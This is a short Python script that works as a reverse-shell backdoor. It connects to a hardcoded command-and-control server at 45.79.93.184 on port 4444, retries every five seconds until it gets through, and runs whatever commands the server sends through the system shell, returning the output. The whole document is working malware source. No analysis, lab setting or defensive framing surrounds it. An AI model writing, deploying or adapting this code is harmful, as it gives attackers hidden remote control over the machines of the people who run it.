import socket
import subprocess
import os
import time

# IP address and port of the C&C server
SERVER_IP = "45.79.93.184"
SERVER_PORT = 4444

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except socket.error:
            time.sleep(5)

def main():
    s = connect_to_server()

    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
                s.send(b"Changed directory to " + os.getcwd().encode() + b"\n")
            except Exception as e:
                s.send(str(e).encode() + b"\n")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            s.send(stdout_value)

    s.close()

if __name__ == "__main__":
    main()
